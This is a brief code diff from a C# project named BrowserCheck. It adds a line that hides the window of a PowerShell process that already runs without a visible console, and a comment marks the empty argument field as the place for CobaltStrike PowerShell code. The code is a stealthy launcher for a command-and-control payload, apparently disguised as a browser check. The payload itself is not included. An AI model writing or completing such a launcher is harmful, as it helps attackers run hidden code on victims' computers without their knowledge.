@@ -55,6 +55,7 @@ namespace BrowserCheck
             startInfo.FileName = "powershell.exe";
             startInfo.CreateNoWindow = true;
             startInfo.UseShellExecute = true;
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
             startInfo.Arguments = ""; // **** Need to include CobaltStrike PowerShell code here ****
             Process.Start(startInfo);
         }
